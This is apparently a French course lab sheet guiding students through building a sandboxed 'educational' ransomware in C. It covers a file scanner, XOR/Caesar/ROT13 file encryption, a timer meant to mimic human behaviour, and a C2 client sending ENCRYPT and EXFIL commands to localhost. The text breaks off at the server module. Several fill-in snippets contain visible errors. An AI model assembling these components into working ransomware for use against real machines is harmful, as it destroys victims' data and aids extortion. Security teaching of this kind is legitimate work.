# TP Jour 5 : Ransomware Éducatif avec Infrastructure C2

## ⚠️ AVERTISSEMENT CRITIQUE

**CE TP EST STRICTEMENT ÉDUCATIF - TOUTE UTILISATION EN DEHORS DU SANDBOX EST ILLÉGALE**

---

## 📋 Objectifs Pédagogiques

À la fin de ce TP, vous serez capable de :
- Implémenter une architecture client-serveur C2
- Développer 3 algorithmes de chiffrement (XOR, César, ROT13)
- Créer un système d'exfiltration de données
- Concevoir un backdoor avec contrôle d'accès
- Obfusquer du code C
- Appliquer des techniques de vérification d'intégrité
- Comprendre les mécanismes de détection et défense

---

## 🎯 Hiérarchisation des Modules

### Progression recommandée
Les modules doivent être implémentés dans l'ordre suivant pour respecter les dépendances :

#### **Phase 1 : Fondations (Modules de base)**
| Module | Priorité | Complexité |
|--------|----------|------------|
| **Scanner** | CRITIQUE | Moyenne |
| **Config** | CRITIQUE | Moyenne |
| **Timer** | FAIBLE | Facile |

*Ces modules sont requis pour les phases suivantes*

#### **Phase 2 : Cryptographie (Implémentables en parallèle)**
| Module | Priorité | Complexité |
|--------|----------|------------|
| **Crypto ROT13** | MOYENNE | Facile |
| **Crypto César** | MOYENNE | Moyenne |
| **Crypto XOR** | HAUTE | Moyenne |
| **Checksum** | MOYENNE | Moyenne |

*Commencez par ROT13 (le plus simple), puis passez aux autres*

#### **Phase 3 : Infrastructure C2 (Dépendances critiques)**
| Module | Priorité | Complexité |
|--------|----------|------------|
| **Serveur C2** | CRITIQUE | Difficile |
| **Client C2** | CRITIQUE | Difficile |

*Le serveur doit être opérationnel avant de tester le client*

#### **Phase 4 : Fonctionnalités avancées (Optionnelles)**
| Module | Priorité | Complexité |
|--------|----------|------------|
| **Exfiltration** | HAUTE | Difficile |
| **Backdoor** | MOYENNE | Difficile |
| **Obfuscation** | FAIBLE | Difficile |

*Ces modules peuvent être omis si le temps manque*

### 📌 Conseil de répartition dans le groupe
- **Modules critiques** : À prioriser par tous
- **Modules en parallèle** : Répartissez-vous les 4 algos de crypto
- **Modules avancés** : Implémentez-les si le temps le permet

---

## 🛠️ Prérequis Techniques

### 1. Configuration de l'environnement
```bash
cd "Jour 5"
chmod +x setup_sandbox.sh test_ransomware.sh
./setup_sandbox.sh
```

Cela créera :
```
sandbox/
├── documents/      # Fichiers texte à chiffrer
├── images/         # Images PNG/JPG
├── archives/       # Fichiers ZIP
└── sensitive/      # Données "sensibles" à exfiltrer
```

### 2. Vérification
```bash
ls -R sandbox/
# Vous devez voir environ 50 fichiers de test
```

---

## 📦 MODULE 1 : Scanner de Fichiers

**Objectif** : Parcourir récursivement un répertoire et filtrer les fichiers

### Fichier : `TP/scanner.h`
```c
#ifndef SCANNER_H
#define SCANNER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#define MAX_PATH 4096
#define MAX_FILES 10000

// Scan un répertoire (non récursif)
int scan_directory(const char *path, char files[][MAX_PATH], int max_files);

// Scan récursivement un répertoire
int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count);

// Vérifie si un fichier doit être exclu
int should_exclude(const char *filename);

#endif
```

### Implémentation guidée : `scanner.c`

#### Étape 1 : Créer la structure de base (CODE)
```c
#include "scanner.h"

int scan_directory(const char *path, char files[][MAX_PATH], int max_files) {
    // Scan non-récursif d'un répertoire
    DIR *dir = opendir(path);
    if (!dir) return 0;
    
    int count = 0;
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL && count < max_files) {
        // Ignorer . et ..
        if (strcmp(entry->d_name, "_") == 0 || strcmp(entry->d_name, "_") == 0)
            continue;
            
        // Construire le chemin complet
        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s/%s", path, entry->d_name);
        
        // Vérifier si c'est un fichier (pas un dossier)
        struct stat st;
        if (stat(fullpath, &st) == 0 && S_ISREG(st.st_mode)) {
            if (!should_exclude(entry->d_name)) {
                strcpy(files[count], fullpath);
                _____;
            }
        }
    }
    
    closedir(dir);
    return count;
}
```

#### Étape 2 : Fonction récursive (CODE GUIDÉ)
```c
int scan_recursive(const char *path, char files[][MAX_PATH], int max_files, int current_count) {
    DIR *dir = opendir(path);
    if (dir == NULL) {
        return current_count;  // Permissions refusées ou chemin invalide
    }
    
    int count = current_count;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL && count < max_files) {
        
        // Ignorer "." et ".." (CODE FOURNI)
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        // Construire le chemin complet (CODE FOURNI)
        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s/%s", path, entry->d_name);
        
        // Récupérer les infos du fichier (CODE FOURNI)
        struct stat file_stat;
        if (stat(full_path, &file_stat) != 0) {
            ________;  // Erreur, on ignore cette entrée
        }
        
        // Traitement selon le type
        if (S_ISDIR(file_stat.st_mode)) {
            // C'est un dossier : appel récursif
            count = scan_recursive(full_path, files, max_files, count);
        } 
        else if (S_ISREG(file_stat.st_mode)) {
            // C'est un fichier régulier
            if (!should_exclude(entry->d_name)) {
                // Le fichier n'est pas exclu, on l'ajoute
                // À COMPLÉTER : 
                // 1. Copier full_path dans files[count] avec strcpy()
                // 2. Incrémenter count
                strcpy(files[count], full_path);
                count++;
            }
        }
    }
    
    closedir(dir);
    return count;
}
```

#### Étape 3 : Fonction d'exclusion (CODE GUIDÉ)
```c
int should_exclude(const char *filename) {
    // Vérifier si le nom de fichier commence par '.'
    if (filename[0] == '.') {
        return 1;  // Exclure les fichiers cachés
    }
    
    // Vérifier si le nom contient ".git"
    if (strstr(filename, ".git") != NULL) {
        return 1;  // Exclure
    }
    
    // À COMPLÉTER : Faire la même chose pour ".exclude"
    if (strstr(filename, ".exclude") != NULL) {
        return 1;
    }
    
    return 0;  // Par défaut, ne pas exclure
}
```



### Programme de test : `test_scanner.c`
```c
#include "scanner.h"
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <directory>\n", argv[0]);
        return 1;
    }
    
    printf("Scanning directory: %s\n", argv[1]);
    
    char files[MAX_FILES][MAX_PATH];
    int count = scan_recursive(argv[1], files, MAX_FILES, 0);
    
    printf("Found %d files:\n", count);
    for (int i = 0; i < count; i++) {
        printf("  [%d] %s\n", i+1, files[i]);
    }
    
    return 0;
}
```

### Compilation et test
```bash
gcc -o test_scanner modules.c test_scanner.c -I.
./test_scanner sandbox/
# Devrait lister tous les fichiers trouvés
```

### 💡 Aide-mémoire

**Ce que vous devez compléter** :
1. Dans `scan_recursive()` : L'appel récursif pour les dossiers
2. Dans `scan_recursive()` : Copier le chemin dans la liste avec `strcpy()`
3. Dans `should_exclude()` : Vérifier ".exclude" comme pour ".git"

- `count = scan_recursive(full_path, files, max_files, count);` ← Appel récursif
3. Dans `should_exclude()` : Vérifier ".exclude" comme pour ".git"

**Fonctions à utiliser** :
- `scan_recursive(full_path, list);` ← Appel récursif
- `strcpy(list->paths[list->count], full_path);` ← Copie de chaîne
- `list->count++;` ← Incrémenter le compteur

### ❓ Questions de réflexion
1. Pourquoi vérifie-t-on `list->count < MAX_FILES` ?
2. Que se passe-t-il si on oublie d'incrémenter `list->count` ?
3. Pourquoi la fonction s'appelle elle-même (récursivité) ?

---

## 🔐 MODULE 2 : Chiffrement XOR

**Objectif** : Implémenter un chiffrement symétrique simple

### Fichier : `TP/xor_crypto.h`
```c
#ifndef XOR_CRYPTO_H
#define XOR_CRYPTO_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 4096

// XOR un buffer avec une clé
void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len);

// Chiffre un fichier avec XOR
int xor_encrypt_file(const char *input, const char *output, const char *key);

// Déchiffre un fichier avec XOR (identique à encrypt)
int xor_decrypt_file(const char *input, const char *output, const char *key);

#endif
```

### Implémentation guidée : `crypto_xor.c`

#### Étape 1 : Fonction xor_buffer (CODE FOURNI)
```c
#include "xor_crypto.h"

void xor_buffer(char *buffer, size_t size, const char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i % key_len];  // XOR avec rotation de clé
    }
}
```

#### Étape 2 : Fonction xor_encrypt_file (CODE GUIDÉ)
```c
#include <stdio.h>

#define BUFFER_SIZE 4096

int xor_encrypt_file(const char *input, const char *output, const char *key) {
    size_t key_len = strlen(key);
    
    // Ouvrir le fichier d'entrée en lecture binaire (CODE FOURNI)
    FILE *fin = fopen(input, "rb");
    if (!input) {
        return -1;  // Erreur d'ouverture
    }
    
    // Ouvrir le fichier de sortie en écriture binaire (CODE FOURNI)
    FILE *output = fopen(output_path, "wb");
    if (!output) {
        fclose(input);
        return ___;  // Que retourner en cas d'erreur ?
    }
    
    // Buffer pour lire les données par blocs (CODE FOURNI)
    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    
    // Boucle de lecture/chiffrement/écriture (CODE GUIDÉ)
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fin)) > 0) {
        
        // À COMPLÉTER : Chiffrer le buffer avec xor_buffer()
        xor_buffer(buffer, bytes_read, key, key_len);
        
        
        // Écrire le buffer chiffré (CODE FOURNI)
        size_t bytes_written = fwrite(buffer, 1, bytes_read, fout);
        if (bytes_written != bytes_read) {
            fclose(fin);
            fclose(fout);
            return -1;  // Erreur d'écriture
        }
    }
    
    // Fermer les fichiers (CODE FOURNI)
    fclose(fin);
    fclose(fout);
    return 0;  // Succès
}
```

#### Étape 3 : Fonction xor_decrypt_file (CODE GUIDÉ)
```c
int xor_decrypt_file(const char *input, const char *output, const char *key) {
    
    // ASTUCE : XOR est symétrique !
    // Chiffrer et déchiffrer sont la même opération
    
    // À COMPLÉTER : Appeler xor_encrypt_file()
    return xor_encrypt_file(input, output, key);
    
}
```

### Programme de test : `test_xor.c`
```c
#include "xor_crypto.h"
#include <stdio.h>
#include <string.h>

int main() {
    const char *key = "MY_SECRET_KEY";
    
    printf("Test 1: Chiffrement...\n");
    if (xor_encrypt_file("test.txt", "test.enc", key) != 0) {
        printf("❌ Échec du chiffrement\n");
        return 1;
    }
    printf("✓ Fichier chiffré\n");
    
    printf("\nTest 2: Déchiffrement...\n");
    if (xor_decrypt_file("test.enc", "test.dec", key) != 0) {
        printf("❌ Échec du déchiffrement\n");
        return 1;
    }
    printf("✓ Fichier déchiffré\n");
    
    printf("\nVérifiez avec: diff test.txt test.dec\n");
    return 0;
}
```

### Compilation et test
```bash
# Créer un fichier de test
echo "SECRET DATA TO ENCRYPT" > test.txt

# Compiler
gcc -o test_xor modules.c test_xor.c -I.

# Tester
./test_xor

# Vérifier
diff test.txt test.dec  # Doit être identique
```

### 💡 Aide-mémoire

**Fonctions à utiliser** :
- `fopen(path, "rb")` ← Ouvrir en lecture binaire
- `fopen(path, "wb")` ← Ouvrir en écriture binaire
- `fread(buffer, 1, size, file)` ← Lire des octets
- `fwrite(buffer, 1, size, file)` ← Écrire des octets
- `fclose(file)` ← Fermer le fichier

### ❓ Questions de réflexion
1. Pourquoi utilise-t-on `i % key_len` dans la fonction XOR ?
2. Pourquoi XOR est-il réversible (chiffrement = déchiffrement) ?
3. Que se passe-t-il si la clé est trop courte ?

---

## 🔤 MODULE 3 : Chiffrement César

**Objectif** : Décalage alphabétique

### Fichier : `TP/caesar_crypto.h`
```c
#ifndef CAESAR_CRYPTO_H
#define CAESAR_CRYPTO_H

#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

// Applique César à un caractère
char caesar_char(char c, int shift);

// Chiffre un fichier avec César
int caesar_encrypt_file(const char *input, const char *output, int shift);

// Déchiffre un fichier avec César
int caesar_decrypt_file(const char *input, const char *output, int shift);

#endif
```

### Implémentation guidée : `caesar_crypto.c`

#### Étape 1 : Fonction caesar_char (CODE GUIDÉ)
```c
#include "caesar_crypto.h"

char caesar_char(char c, int shift) {
    // Si c une majuscule (A-Z)
    if (__________________________) {
        // À COMPLÉTER : Appliquer la formule César
        // Chercher par vous-même la formule correcte
        return __________________________;
        
    }
    // Si c'est une minuscule (a-z)
    else if (_____________________) {  // Quelles lettres ?
        return __________________________;
    }
    // Sinon (chiffres, ponctuation, espaces)
    else {
        return ___;  // Ne pas modifier
    }
}
```

#### Étape 2 : Fonction caesar_encrypt_file (CODE GUIDÉ)
```c
#include <stdio.h>

int caesar_encrypt_file(const char *input, const char *output, int shift) {
    FILE *fin = fopen(input, "r");
    if (!fin) return -1;
    
    FILE *fout = fopen(output, "w");
    if (!fout) {
        fclose(fin);
        return -1;
    }
    
    int c;
    while ((c = fgetc(fin)) != EOF) {
        // À COMPLÉTER : Chiffrer le caractère et l'écrire
        char encrypted = caesar_char((char)c, shift);
        fputc(encrypted, fout);
    }
    
    fclose(fin);
    fclose(fout);
    return 0;
}
```

#### Étape 3 : Fonction caesar_decrypt_file (CODE GUIDÉ)
```c
int caesar_decrypt_file(const char *input, const char *output, int shift) {
    // Pour déchiffrer, utiliser un décalage inverse
    return caesar_encrypt_file(input, output, 26 - shift);
}
```

### Programme de test : `test_caesar.c`
```c
#include "caesar_crypto.h"
#include <stdio.h>

int main() {
    printf("Test 1: Chiffrement César (shift=3)...\n");
    caesar_encrypt_file("test.txt", "test.enc", 3);
    printf("✓ Fichier chiffré\n");
    
    printf("\nTest 2: Déchiffrement...\n");
    caesar_decrypt_file("test.enc", "test.dec", 3);
    printf("✓ Fichier déchiffré\n");
    
    printf("\nVérifiez avec: diff test.txt test.dec\n");
    return 0;
}
```

### Compilation et test
```bash
echo "HELLO WORLD 123" > test.txt
gcc -o test_caesar modules.c test_caesar.c -I.
./test_caesar
cat test.enc  # KHOOR ZRUOG 123
```

### ❓ Questions de réflexion
1. Pourquoi utilise-t-on `% 26` dans la formule ?
2. Comment déchiffrer sans fonction séparée ?
3. Quelle est la faiblesse de César ? 

---

## 🔄 MODULE 4 : Chiffrement ROT13

**Objectif** : Cas spécial de César (shift=13)

### Fichier : `TP/rot13_crypto.h`
```c
#ifndef ROT13_CRYPTO_H
#define ROT13_CRYPTO_H

#include "caesar_crypto.h"

// ROT13 d'un caractère (utilise César avec shift=13)
char rot13_char(char c);

// Chiffre/Déchiffre un fichier avec ROT13
int rot13_file(const char *input, const char *output);

#endif
```

### Implémentation guidée : `rot13_crypto.c`

#### Étape 1 : Fonction rot13_char (CODE GUIDÉ)
```c
#include "rot13_crypto.h"

char rot13_char(char c) {
    // ROT13 est juste César avec shift=13
    return caesar_char(c, 13);
}
```

#### Étape 2 : Fonction rot13_file (CODE GUIDÉ)
```c
#include <stdio.h>

int rot13_file(const char *input, const char *output) {
    // Réutiliser caesar_encrypt_file avec shift=13
    return caesar_encrypt_file(input, output, 13);
}
```

### Programme de test : `test_rot13.c`
```c
#include "rot13_crypto.h"
#include <stdio.h>

int main() {
    printf("Test ROT13 (auto-réversible)...\n");
    
    rot13_file("test.txt", "test.enc");
    printf("✓ Fichier chiffré\n");
    
    // ROT13 deux fois = identique
    rot13_file("test.enc", "test.dec");
    printf("✓ Fichier déchiffré (même opération!)\n");
    
    printf("\nVérifiez avec: diff test.txt test.dec\n");
    return 0;
}
```

### Compilation et test
```bash
echo "The Quick Brown Fox" > test.txt
gcc -o test_rot13 modules.c test_rot13.c -I.
./test_rot13
cat test.enc  # Gur Dhvpx Oebja Sbk
```

### 💡 Aide-mémoire

**Propriété magique de ROT13** :
- ROT13(ROT13(texte)) = texte
- Pas besoin de fonction decrypt séparée !
- C'est juste César avec shift=13

### ❓ Questions de réflexion
1. Pourquoi ROT13 est-il auto-réversible ?
2. Quelle est la relation entre 13 et 26 ?
3. ROT13 est-il plus sûr que César ?

---

## ✅ MODULE 5 : Vérification d'Intégrité (Checksum)

**Objectif** : Calculer CRC32 et MD5

### Fichier : `TP/checksum.h`
```c
#ifndef CHECKSUM_H
#define CHECKSUM_H

#include <stdint.h>
#include <stddef.h>

// Calcule CRC32 d'un fichier
uint32_t calculate_crc32(const char *filepath);

// Calcule MD5 (version simplifiée éducative)
void calculate_md5(const char *filepath, char output[33]);

// Vérifie si un fichier a été modifié
int verify_integrity(const char *filepath, uint32_t expected_crc);

#endif
```

### Implémentation guidée : `checksum.c`

#### Étape 1 : Algorithme CRC32 (CODE FOURNI)
```c
#include "checksum.h"

uint32_t crc32(const unsigned char *data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}
```

#### Étape 2 : Fonction calculate_crc32 (CODE GUIDÉ)
```c
#include <stdio.h>
#include <stdlib.h>

#define BUFFER_SIZE 4096

uint32_t calculate_crc32(const char *filepath) {
    FILE *file = fopen(filepath, "rb");
    if (!file) return 0;
    
    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;
    uint32_t final_crc = 0xFFFFFFFF;  // Initialisation
    
    // Lire le fichier par blocs
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        // À COMPLÉTER : Calculer CRC32 du buffer
        // uint32_t block_crc = crc32(_______, _________);
        // final_crc ^= block_crc;  // Combiner les CRC
        
    }
    
    fclose(file);
    return final_crc;
}
```

#### Étape 3 : Fonction verify_integrity (CODE GUIDÉ)
```c
int verify_integrity(const char *filepath, uint32_t expected_crc) {
    // À COMPLÉTER : Calculer le CRC actuel
    uint32_t actual_crc = ___________________;
    
    // Comparer avec le CRC attendu
    // CONVENTION: Retourne 0 si OK (intégrité vérifiée), -1 si erreur/modifié
    if (actual_crc __ expected_crc) {  // Quelle condition ?
        return 0;  // Intégrité OK
    } else {
        return ___;  // Fichier modifié
    }
}
```

### Programme de test : `test_checksum.c`
```c
#include "checksum.h"
#include <stdio.h>

int main() {
    const char *file = "test.txt";
    
    printf("Calcul du CRC32...\n");
    uint32_t crc = calculate_crc32(file);
    printf("CRC32: 0x%08X\n", crc);
    
    printf("\nVérification d'intégrité...\n");
    if (verify_integrity(file, crc) == 0) {  // 0 = succès
        printf("✓ Fichier intègre\n");
    } else {
        printf("✗ Fichier modifié !\n");
    }
    
    return 0;
}
```

### Compilation et test
```bash
echo "test data" > test.txt
gcc -o test_checksum checksum.c test_checksum.c -I.
./test_checksum
```

### ❓ Questions de réflexion
1. À quoi sert un checksum ?
2. Peut-on détecter toutes les modifications ?
3. CRC32 vs MD5 : quelle différence ?

---

## ⏲️ MODULE 6 : Timer (Délais)

**Objectif** : Temporiser les actions pour faire croire a un comportement humain

### Fichier : `TP/timer.h`
```c
#ifndef TIMER_H
#define TIMER_H

// Attend N secondes
void wait_seconds(int seconds);

// Attend jusqu'à une date précise (timestamp UNIX)
void wait_until(long timestamp);

// Retourne le timestamp actuel
long get_current_timestamp();

#endif
```

### Implémentation guidée : `timer.c`

#### Étape 1 : Fonction get_current_timestamp (CODE FOURNI)
```c
#include "timer.h"
#include <time.h>
#include <unistd.h>

long get_current_timestamp() {
    return (long)time(NULL);  // Timestamp UNIX en secondes
}
```

#### Étape 2 : Fonction wait_seconds (CODE GUIDÉ)
```c
void wait_seconds(int seconds) {
    // À COMPLÉTER : Utiliser sleep() pour attendre
    
}
```

#### Étape 3 : Fonction wait_until (CODE GUIDÉ)
```c
void wait_until(long target_timestamp) {
    while (1) {
        long current = get_current_timestamp();
        
        // Si on a atteint la cible, sortir
        if (___________ __ __________) {  // Quelle condition ?
            break;
        }
        
        // Attendre 1 seconde avant de revérifier
        // À COMPLÉTER : Appeler wait_seconds(1)
        
    }
}
```

### Programme de test : `test_timer.c`
```c
#include "timer.h"
#include <stdio.h>

int main(int argc, char *argv[]) {
    int delay = 3;
    if (argc > 1) delay = atoi(argv[1]);
    
    printf("Test 1: Attendre %d secondes...\n", delay);
    long start = get_current_timestamp();
    wait_seconds(delay);
    long end = get_current_timestamp();
    printf("✓ Durée réelle: %ld secondes\n", end - start);
    
    printf("\nTest 2: Attendre jusqu'à un timestamp...\n");
    long target = get_current_timestamp() + 2;
    printf("Timestamp cible: %ld\n", target);
    wait_until(target);
    printf("✓ Cible atteinte !\n");
    
    return 0;
}
```

### Compilation et test
```bash
gcc -o test_timer timer.c test_timer.c -I.
time ./test_timer 3
# real    0m3.001s
```

### ❓ Questions de réflexion
1. Pourquoi utiliser sleep() dans wait_until() ?
2. Qu'est-ce qu'un timestamp UNIX ?
3. Comment attendre avec plus de précision (millisecondes) ?

---

## ⚙️ MODULE 7 : Configuration (Whitelist/Blacklist)

**Objectif** : Gérer les exclusions de fichiers

### Fichier : `TP/config.h`
```c
#ifndef CONFIG_H
#define CONFIG_H

#define MAX_PATTERNS 100

typedef struct {
    char whitelist[MAX_PATTERNS][256];  // Extensions autorisées
    char blacklist[MAX_PATTERNS][256];  // Chemins exclus
    int whitelist_count;
    int blacklist_count;
} Config;

// Charge config.txt
Config* load_config(const char *config_file);

// Vérifie si un fichier correspond aux critères
int is_allowed(const Config *cfg, const char *filepath);

void free_config(Config *cfg);

#endif
```

### Format de `config.txt`
```ini
[WHITELIST]
.txt
.pdf
.docx
.jpg
.png

[BLACKLIST]
/home/user/.ssh/
/etc/
/boot/
.git/
```

### Implémentation guidée : `config.c`

#### Étape 1 : Fonction load_config (CODE GUIDÉ)
```c
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

Config* load_config(const char *config_file) {
    Config *cfg = malloc(sizeof(Config));
    if (!cfg) return NULL;
    
    cfg->whitelist_count = 0;
    cfg->blacklist_count = 0;
    
    FILE *file = fopen(config_file, "r");
    if (!file) {
        free(cfg);
        return NULL;
    }
    
    char line[256];
    int in_whitelist = 0, in_blacklist = 0;
    
    while (fgets(line, sizeof(line), file)) {
        // Enlever le \n à la fin (CODE FOURNI)
        line[strcspn(line, "\n")] = 0;
        
        // Détecter les sections
        if (strcmp(line, "[WHITELIST]") == _) {
            in_whitelist = 1;
            in_blacklist = 0;
            ________;
        }
        else if (strcmp(line, "[BLACKLIST]") __ __) {  // À compléter
            in_whitelist = 0;
            in_blacklist = ___;
            __________;
        }
        
        // Ignorer lignes vides
        if (strlen(line) == _) ________;
        
        // Ajouter à la whitelist
        if (in_whitelist && cfg->whitelist_count < MAX_PATTERNS) {
            strcpy(cfg->whitelist[cfg->whitelist_count], line);
            cfg->whitelist_count++;
        }
        // À COMPLÉTER : Ajouter à la blacklist
        // else if (in_blacklist && cfg->blacklist_count < MAX_PATTERNS) {
        //     ...
        // }
        
    }
    
    fclose(_________);
    return cfg;
}
```

#### Étape 2 : Fonction is_allowed (CODE GUIDÉ)
```c
int is_allowed(const Config *cfg, const char *filepath) {
    // Vérifier si le fichier est dans la blacklist
    for (int i = 0; i < cfg->blacklist_count; i++) {
        if (strstr(filepath, cfg->blacklist[i]) != NULL) {
            return ___;  // Fichier bloqué
        }
    }
    
    // Vérifier si l'extension est dans la whitelist
    for (int i = 0; i < cfg->whitelist_count; i++) {
        // À COMPLÉTER : Utiliser strstr pour vérifier l'extension
        // if (strstr(filepath, cfg->whitelist[i]) != NULL) {
        //     return ___;
        // }
        
    }
    
    return _;  // Non autorisé par défaut
}
```

#### Étape 3 : Libération mémoire (CODE )
```c
void free_config(Config *cfg) {
    if (cfg != NULL) {
        free(___);
    }
}
```

### Programme de test : `test_config.c`
```c
#include "config.h"
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <config.txt> <filepath>\n", argv[0]);
        return 1;
    }
    
    Config *cfg = load_config(argv[1]);
    if (!cfg) {
        printf("❌ Erreur chargement config\n");
        return 1;
    }
    
    printf("Whitelist (%d entrées): ", cfg->whitelist_count);
    for (int i = 0; i < cfg->whitelist_count; i++) {
        printf("%s ", cfg->whitelist[i]);
    }
    printf("\n");
    
    printf("Blacklist (%d entrées): ", cfg->blacklist_count);
    for (int i = 0; i < cfg->blacklist_count; i++) {
        printf("%s ", cfg->blacklist[i]);
    }
    printf("\n\n");
    
    if (is_allowed(cfg, argv[2])) {
        printf("✓ Autorisé: %s\n", argv[2]);
    } else {
        printf("✗ Bloqué: %s\n", argv[2]);
    }
    
    free_config(cfg);
    return 0;
}
```

### Compilation et test
```bash
gcc -o test_config config.c test_config.c -I.
./test_config config.txt /home/user/document.pdf
# ✓ Autorisé (extension .pdf)

./test_config config.txt /etc/passwd
# ✗ Bloqué (dans /etc/)
```

### ❓ Questions de réflexion
1. Pourquoi vérifier d'abord la blacklist ?
2. Comment gérer les caractères spéciaux dans les chemins ?
3. Peut-on utiliser des regex au lieu de strstr() ?

---

## 🌐 MODULE 8 : Client C2

**Objectif** : Communication avec le serveur C&C

### Fichier : `TP/c2_client.h`
```c
#ifndef C2_CLIENT_H
#define C2_CLIENT_H

#define C2_SERVER_IP "127.0.0.1"
#define C2_SERVER_PORT 4444

typedef struct {
    char command[64];       // ENCRYPT, DECRYPT, EXFIL, STATUS
    char target[256];       // Chemin du fichier/dossier
    char key[128];          // Clé de chiffrement
    int mode;               // 0=XOR, 1=Caesar, 2=ROT13
    int shift;              // Pour César/ROT13
} C2Command;

typedef struct {
    int status;             // 0=success, -1=error
    char message[512];      // Message de retour
    long bytes_processed;   // Octets traités
} C2Response;

// Connexion au serveur C2
int c2_connect(const char *ip, int port);

// Envoie une commande et attend la réponse
C2Response c2_send_command(int sockfd, const C2Command *cmd);

// Ferme la connexion
void c2_disconnect(int sockfd);

#endif
```

### Implémentation guidée : `c2_client.c`

#### 📌 Étape 1 : Fonction c2_connect (CODE GUIDÉ - Réseau avancé)
```c
#include "c2_client.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int c2_connect(const char *ip, int port) {
    // Créer un socket TCP (CODE FOURNI)
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;
    
    // Configuration de l'adresse du serveur (CODE FOURNI)
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // À COMPLÉTER : Convertir l'IP en format binaire
    // Utilisez : inet_pton(AF_INET, ip, &server_addr.sin_addr);
    if (inet_pton(AF_INET, __, &__________) <= 0) {
        close(sockfd);
        return -1;
    }
    
    // Connexion au serveur (CODE FOURNI)
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }
    
    return sockfd;  // Socket connecté
}
```

#### 📌 Étape 2 : Fonction c2_send_command (CODE GUIDÉ)
```c
C2Response c2_send_command(int sockfd, const C2Command *cmd) {
    C2Response resp;
    memset(&resp, 0, sizeof(resp));
    
    // Envoyer la commande au serveur (CODE FOURNI)
    ssize_t sent = send(sockfd, cmd, sizeof(C2Command), 0);
    
    // À COMPLÉTER : Vérifier que tout a été envoyé
    if (sent __ sizeof(C2Command)) {
        resp.status = -1;
        strcpy(resp.message, "Send failed");
        return resp;
    }
    
    // À COMPLÉTER : Recevoir la réponse du serveur
    ssize_t received = recv(sockfd, &resp, sizeof(______), 0);
    if (received <= 0) {
        resp.status = -1;
        strcpy(resp.message, "Receive failed");
    }
    
    return ____;
}
```

#### 📌 Étape 3 : Fonction c2_disconnect (CODE )
```c
void c2_disconnect(int sockfd) {
    if (sockfd >= 0) {
        close(_____);
    }
}
```

### Programme de test : `test_c2_client.c`
```c
#include "c2_client.h"
#include <stdio.h>
#include <string.h>

int main() {
    printf("=== Test Client C2 ===\n");
    printf("Connexion au serveur C2 (%s:%d)...\n", C2_SERVER_IP, C2_SERVER_PORT);
    
    int sock = c2_connect(C2_SERVER_IP, C2_SERVER_PORT);
    if (sock < 0) {
        printf("❌ Connexion échouée (le serveur est-il démarré ?)\n");
        return 1;
    }
    printf("✓ Connecté au serveur C2\n\n");
    
    // Test 1 : Commande STATUS
    C2Command cmd;
    memset(&cmd, 0, sizeof(cmd));
    strcpy(cmd.command, "STATUS");
    
    printf("Envoi commande STATUS...\n");
    C2Response resp = c2_send_command(sock, &cmd);
    printf("Réponse: %s (status=%d)\n\n", resp.message, resp.status);
    
    // Test 2 : Commande ENCRYPT
    memset(&cmd, 0, sizeof(cmd));
    strcpy(cmd.command, "ENCRYPT");
    strcpy(cmd.target, "/tmp/test.txt");
    strcpy(cmd.key, "secret123");
    cmd.mode = 0;  // XOR
    
    printf("Envoi commande ENCRYPT...\n");
    resp = c2_send_command(sock, &cmd);
    printf("Réponse: %s (status=%d)\n", resp.message, resp.status);
    
    c2_disconnect(sock);
    printf("\n✓ Déconnecté\n");
    return 0;
}
```

### Compilation et test
```bash
# Compiler le client
gcc -o test_c2_client c2_client.c test_c2_client.c -I.

# Démarrer le serveur dans un autre terminal d'abord !
# (Voir MODULE 9)

# Puis tester le client
./test_c2_client
# ✓ Connecté au serveur C2
# Réponse: Server OK (status=0)
```

**Ordre de bytes** :
- `htons(port)` : Convertit port en "network byte order" (big-endian)

### ❓ Questions de réflexion
1. Pourquoi utiliser TCP et pas UDP pour le C2 ?
2. Que fait exactement `htons()` ?
3. Comment gérer la déconnexion brutale du serveur ?
4. Pourquoi vérifier `received <= 0` ?

---

## 🖥️ MODULE 9 : Serveur C2

**Objectif** : Gérer plusieurs clients simultanément avec des threads

⚠️ **Module avancé** : Ce module utilise des threads et des sockets. La structure complète est fournie, vous devez compléter la logique de traitement des commandes.

### Fichier : `TP/c2_server.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include "c2_client.h"

#define MAX_CLIENTS 10
#define BACKLOG 5
```

#### 📌 Étape 1 : Fonction handle_client (CODE GUIDÉ)
```c
// Traite un client dans un thread séparé
void* handle_client(void *arg) {
